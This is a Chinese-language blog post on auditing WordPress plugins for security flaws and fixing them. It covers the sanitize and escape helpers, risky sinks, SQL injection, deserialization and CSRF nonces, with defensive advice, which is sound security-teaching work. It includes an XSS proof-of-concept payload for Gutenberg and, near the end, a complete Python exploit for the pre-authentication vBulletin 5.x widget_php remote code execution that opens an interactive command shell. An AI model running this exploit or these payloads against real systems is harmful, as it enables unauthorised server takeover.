---
layout: post
title:  "Wordpress插件漏洞的攻防浅析"
date:   2019-10-23 23:40 +0800
categories: vuln
category: vuln
---

<p>
	<span style="color:#DAA520;"><strong>一般出名点的开源软件，比如wordpress的核心高危漏洞是比较难挖的。但其附属的高用户量的插件漏洞也是具有一定的价值的，而挖掘起来相对容易些，这里就来简单谈谈wordpress插件漏洞的挖掘和修复。</strong></span>
</p>


### 常用输入点


- $_GET
- $_POST
- $_REQUEST
- $_SERVER['REQUEST_URI']
- $_SERVER['PHP_SELF']
- $_SERVER['HTTP_REFERER']
- $_COOKIE



如果要挖掘指定的cms漏洞，我们就需要去寻找代码里，一些比较重要的自带函数是否存在漏洞。或者也可以看看一些安全过滤函数，是否得到了正确应用。

### 输入检查

例如， 开发者可以使用sanitize_email()来清理电子邮件的地址，使用sanitize_text_field()来清理文本，使用sanitize_sql_orderby()来验证SQL的ORDER BY语句等。 WordPress中的sanitize_*()类辅助函数已经覆盖了大多数用户输入类型：


- sanitize_email()
- sanitize_file_name()
- sanitize_hex_color()
- sanitize_hex_color_no_hash()
- sanitize_html_class()
- sanitize_key()
- sanitize_meta()
- sanitize_mime_type()
- sanitize_option()
- sanitize_sql_orderby()
- sanitize_text_field()
- sanitize_title()
- sanitize_title_for_query()
- sanitize_title_with_dashes()
- sanitize_user()
- esc_url_raw()
- wp_filter_post_kses()
- wp_filter_nohtml_kses()

### 输出检查

如果没有做好输出检查，可能会导致各种模板注入或者xss一类的漏洞。

- esc_html() 更改html响应类型
- esc_url() 过滤url里的内容。
- esc_js()  过滤内联js内容的输出内容。
- esc_attr() 用于过滤输出点在标签属性中的情况，相应的转义。
- esc_textarea() 用于过滤输出点在textarea标签中的情况，相应的转义。
- tag_escape() 用于出现在HTML标签中的情况，主要用于正则。

### xss

举例：

- add_query_arg()
- remove_query_arg()


上面两个是wordpress用来动态添加/删除参数的，要是保持默认不指定字符串作为参数：

```
echo add_query_arg( array(
    'key1' => 'value1',
    'key2' => 'value2',
), 'http://example.com' );
```

他会使用未经过转义的$_SERVER['REQUEST_URI']，而不是$_SERVER['PHP_SELF']，这样直接打印出来可能会造成xss漏洞。

防范的话：
- 在重定向或者header里面建议使用esc_url_raw。
- 打印完整url时，需要使用esc_url来转为HTML实体。


如果完全不考虑在文章里加入未过滤的html标签，有个函数是对wordpress超级管理员也生效的
如果要屏蔽所有的用户，包括管理员，超级管理员，我们可以这样设置：


```
define( 'DISALLOW_UNFILTERED_HTML', true );
```


#### 输出渲染导致的HTML实体编码失效

比如，在WordPress内置的编辑器Gutenberg中（WordPress 5.0到5.2.2相关联），FortiGuard Labs的威胁研究人员Zhouyuan Yang表示，如果文章中包含一条“Shortcode”的错误信息，则Gutenberg无法过滤文章的javascript/HTML代码。

Shortcode本质上是WordPress用户用来嵌入文件或创建对象的快捷方式，这些对象和文件通常涉及复杂的代码，而Shortcode数据块可以通过单击Gutenberg编辑器中的“Add Block”按钮添加到页面中。

然而，根据分析，当将某些被编码的HTML字符(如\&lt;)添加到Shortcode数据块中时，就会发生某些错误。

在Wordpress预览文章时会把\&lt;解码为<，此时XSS过滤器毫无反应。相关PoC：

```
&gt;&lt;img src=1 on error=prompt(1)&gt;。
```


这种情况下就只有直接replace特殊符号为空了，不过也算小概率事件，一般在富文本渲染和留言处多见。

#### 响应格式不明

另外，在没有选项参数的情况下使用json_encode函数，会导致PHP不会转义其他字符（参见JSON_HEX_TAG）。因此，我们可以将任意HTML注入到响应中，但是没有浏览器会在JSON响应中评估HTML吗？好吧，只有当您的JSON响应告诉浏览器它实际上就是JSON的时候才会评估，示例见：
[json_encode](https://xz.aliyun.com/t/2643)

```
function evomdt_ajax(){
  if(empty($_POST['type'])) return;

  $type = $_POST['type'];
  $output = '';

  switch($type){
  case 'newform':
    echo json_encode(array(
      'content' =>$this->mdt_form($_POST['eventid'], $_POST['tax']),
      'status'=>'good'
    )); exit;
  break;
  case 'editform':
    echo json_encode(array(
      'content' =>$this->mdt_form($_POST['eventid'], $_POST['tax'],$_POST['termid'] ),
      'status'=>'good'
    )); exit;
  break;
}
```

响应格式为text/html，而不是application/json：


```
HTTP/1.1 200 OK
[...]
Content-Type: text/html; charset=UTF-8

{"content":[...]
```


### SQL注入

下面是wordpress自带的不安全的sql查询关键词，需要我们单独去调用过滤函数：


- $wpdb->query()
- $wpdb->get_var()
- $wpdb->get_row()
- $wpdb->get_col()
- $wpdb->get_results()
- $wpdb->replace()

安全的sql函数：


- $wpdb->insert()
- $wpdb->update()
- $wpdb->delete()
- $wpdb->prepare()

在wordpressv3.5以前，可以直接拼接传入语句，容易出现SQL注入漏洞：

```
$wpdb->query( $wpdb->prepare( "INSERT INTO table (user, pass) VALUES ('$user', '$pass')" ) );
```

现在新版的wordpress里面声明就友好多了，需要占位符依次传入参数：

```
<?php $sql = $wpdb->prepare( 'query' , value_parameter[, value_parameter ... ] ); ?>
```

下面的函数挺好用，但这里的转义只会转义特殊字符，对于order by和未用单引号闭合的参数是不能预防的。


- esc_sql()
- escape()
- esc_like()
- like_escape()


**$wpdb->prepare()真香系列。**

官方的说法是：


> In 99% of cases, you can use $wpdb->prepare() instead, and that is the recommended method. 

> This function is only for use in those rare cases where you can't easily use $wpdb->prepare(). 

> One example is preparing an array for use in an IN clause.



注意，新版wordpress会自动将$_GET\$_POST\$_COOKIE\$_SERVER中的值，使用add_magic_quotes方法进行过滤。



但值得一提的是，随后，将过滤后的GET与POST数组合并后覆盖$_REQUEST。在以往一些安全性不高的程序中，往往会出现，过滤了GET与POST，却忘记过滤REQUEST的情况，导致漏洞的产生。


另外，在传入数组时，wordpress不会对数组成员进行add_magic_quotes转义。


另外，WordPress除了强制向输入内容添加斜杠外，它还提供了几个内置的过滤函数，用于清理用户输入和保护内容输出。

下面的屏蔽SQL错误，虽然不防延时注入（手动滑稽）：

```
<?php $wpdb->show_errors(); ?> 
<?php $wpdb->hide_errors(); ?> 
<?php $wpdb->print_error(); ?>
```

### 任意文件下载

可疑函数，雷同于普通审计：

- file()
- readfile()
- file_get_contents()


### 文件包含

可疑函数，雷同于普通审计：

- include()
- require()
- include_once()
- require_once()
- fread()


### 文件删除

可疑函数，雷同于普通审计：
```
unlink() 任意删除文件
```

### 文件上传

```
sanitize_file_name() 可以创建有效的php文件, 把test.(php)转为test.php
```
一般情况下，wordpress自带的编辑器上传一般是做了校验的，如果不是的话，可以尝试fuzz一下。
另外，在超管权限下是可以直接编辑模板拿shell或者传插件的，这个需要在服务器上配置限制修改和上传的权限。

### 反序列化漏洞


> unserialize() any raw user input passed to this function is probably exploitable, if serialized() first, probably not vulnerable

一般来说，利用PHP的反序列化漏洞，一般要注意几点：

- phar文件要能够上传到服务器端。
- 要有可用的魔术方法作为“跳板”。
- 文件操作函数的参数可控，且:、/、phar等特殊字符没有被过滤。
- 输入参数值反序列化后，其本身的结果，可以直接触发提权动作。
- 一般主分支难以找到反序列化利用点，所以要尝试在插件的类去找可以利用的魔术方法。

具体可以参考：

- [利用 phar 拓展 php 反序列化漏洞攻击面【wordpress】](https://paper.seebug.org/680/#32-wordpress)
- [ WordPress插件Easy WP SMTP反序列化漏洞分析](https://www.freebuf.com/vuls/198913.html)


### 插件辅助判断

在反序列化之前先进行序列化，会有一定的防治作用，有款wordpress插件提供可反序列化的类，和配套的burp插件可以验证漏洞的存在：

- [wordpress插件分析](https://www.pluginvulnerabilities.com/2017/07/24/wordpress-plugin-for-use-in-testing-for-php-object-injection/)
- [wordpress插件下载](https://www.pluginvulnerabilities.com/wp-content/uploads/2017/07/php-object-injection-test.zip)
- [配套burp插件](https://gist.github.com/ethicalhack3r/7c2618e5fffd564e2734e281c86a2c9b)

大致核心代码如下，稍微解释下，类的__wakeup()方法（*PHP“魔术方法”，unserialize()函数会检查是否存在__wakeup()，如果存在，则会先调用__wakeup()方法，预先准备对象需要的资源），如果一个类定义了__wakeup()方法，那么无论何时该类的某个对象使用了unserialize()函数进行反序列化都能保证__wakeup()方法一定被调用：
```
<?

class PHP_Object_Injection {
   function __wakeup() {
		exit('PHP object injection has occurred.');
   }
}

?>
```
burp插件在检测到关键词时（PHP object...occurred）,会提示检测到漏洞。

### 命令执行

可疑函数，雷同于普通审计：
- system()
- exec()
- passthru()
- shell_exec()

### 代码执行

可疑函数，雷同于普通审计：
- eval()
- assert()
- preg_replace() dangerous "e" flag deprecated since PHP >= 5.5.0 and removed in PHP >= 7.0.0.


### 任意url跳转

系统自带的跳转函数，本身没做检查，需要插件作者自行做过滤，否则会存在任意url跳转的风险。

```
wp_redirect()
```


### CSRF（利用nonce）

在wordpress中，主要用自带的nonce作为token来防治csrf，当然也有过插件作者自造token的。

另外值得一提的是，wordpress的评论机制似乎对csrf没有防御。

在nonce检查中，不是每一步都检查权限的。实际代码跨越了多个文件和函数调用，因此这个过程很容易出现这种缺陷，示例见：
[WordPress权限提升漏洞分析
](https://xz.aliyun.com/t/3659)

下面是对csrf攻击的防御：

- wp_nonce_field() csrf token加入表单
- wp_nonce_url() csrf token加入url
- wp_verify_nonce() 服务端需要验证csrf token
- check_admin_referer() server端检查是否来自admin权限页面【笔者觉得比较鸡肋】

另外，有人提过nonce可以抑制SSRF的产生。


### wordpress权限认证绕过

由于WordPress中的AJAX动作是通过wp-admin/admin-ajax.php文件访问的，所以is_admin()总是返回true。

官方说法：

> Whether the current request is for an administrative interface page. […] Does not check if the user is an administrator; current_user_can() for checking roles and capabilities.



### 可用攻击向量

下面的函数本来是无害的，它们一般会用于构造利用链，做wordpress权限提升。如果没有过滤完全，会比单纯输出打印内容更富有威胁性。

- update_option() 输入未严格验证的时候，可能会触发wordpress的option的更新。
- do_action() 输入未严格验证的时候，会触发wordpress代码执行。
- add_action 触发函数钩子。




### 第三方信任源和自带后门

第三方信任源的问题，主要可能是对第三方网站内容的加载，没有进行合适过滤。

而插件自带后门，可能会存在硬编码，或者缺少权限验证/权限混乱的问题。通过审计代码，黑客可以直接获取网站权限。比如最近vBulletin 5.x的rce【这里没有现成的wp插件举例，大家将就下】：


```
#!/usr/bin/python
import requests
import sys

if len(sys.argv) != 2:
    sys.exit("Usage: %s <URL to vBulletin>" % sys.argv[0])

params = {"routestring":"ajax/render/widget_php"}

while True:
     try:
          cmd = raw_input("vBulletin$ ")
          params["widgetConfig[code]"] = "echo shell_exec('"+cmd+"'); exit;"
          r = requests.post(url = sys.argv[1], data = params)
          if r.status_code == 200:
               print r.text
          else:
               sys.exit("Exploit failed! :(")
     except KeyboardInterrupt:
          sys.exit("\nClosing shell...")
     except Exception, e:
          sys.exit(str(e))
```

从poc来看，这里的利用方式是不需要认证的，直接通过post参数组，传入恶意代码，即可执行命令。
对于这个后门是否为官方故意所为，笔者不好下定论，但这种漏洞确实不少见。
早些年笔者挖掘cve时就曾遇到过，那还是个有几十万用户量的wordpress插件。

### 后记

对于cve漏洞挖掘，还是需要耐心和细心的。毕竟流程复杂的漏洞不好挖，简单的漏洞大部分被人挖过了，尤其是被人怼了个通透的大型开源CMS。

一般白盒和黑盒挖掘需要结合，Fuzz和审计都是有用的。

通过分析语法树，以及动态hook的法子，也越来越被推广使用。

举例说，如果尝试梳理长语法树和调用链，无论是注重深度还是注重广度，一般都需要较高内存机器去跑，说实话耗费资源是不低的。

而一旦这块儿做好了以后，就算我们不一定能主动发现新漏洞。但除了漏洞公告后，我们通过调用链回溯diff出来的点，一般我们都能很快地去定位到可用的漏洞利用链，说不定还有意外惊喜。


### 文章参考

- [wordpress编码标准](https://github.com/WordPress/WordPress-Coding-Standards)
- [Multiple WordPress Plugins SQL Injection Vulnerabilities](https://www.fortinet.com/blog/threat-research/wordpress-plugin-sql-injection-vulnerability.html)
- [评论处wp_filter_post_kses过滤不全](https://xz.aliyun.com/t/4438)
- [渲染导致的HTML实体编码失效](https://xz.aliyun.com/t/6395)
- [使用grep检查wp-sec](https://xz.aliyun.com/t/2643)
- [$wpdb->prepare的修复和正确使用](https://xz.aliyun.com/t/1482)
- [PHP反序列化与Wordpress一些意外Bug的有趣结合](https://xz.aliyun.com/t/2150)
- [wordpress插件安全文档](https://github.com/ethicalhack3r/wordpress_plugin_security_testing_cheat_sheet)
